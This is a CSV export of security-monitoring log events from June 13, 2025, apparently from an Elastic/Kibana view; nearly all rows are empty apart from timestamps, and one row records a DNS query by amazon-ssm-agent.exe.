"@timestamp","process.name","process.command_line","network.transport","source.port","dns.type","event.action"
"Jun 13, 2025 @ 21:18:15.052","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:09.769","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:04.479","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:59.193","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:53.905","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:48.620","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:43.336","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:38.053","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:32.770","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:27.485","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:22.198","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:16.916","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:15.773","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:11.632","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:06.349","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:01.066","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:55.777","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:50.494","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:45.205","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:39.918","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:34.632","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:29.348","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:24.066","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:18.783","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:13.500","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:08.217","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:02.934","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:57.646","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:52.346","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:47.064","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:41.779","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:38.559","amazon-ssm-agent.exe","-","-","-","-","DNSEvent (DNS query)"
"Jun 13, 2025 @ 21:15:36.495","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:31.212","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:25.928","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:20.640","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:15.358","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:10.075","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:04.787","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:59.504","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:54.222","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:48.938","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:43.655","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:38.372","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:33.088","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:27.805","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:22.522","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:17.235","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:11.932","-","-","-","-","-","-"
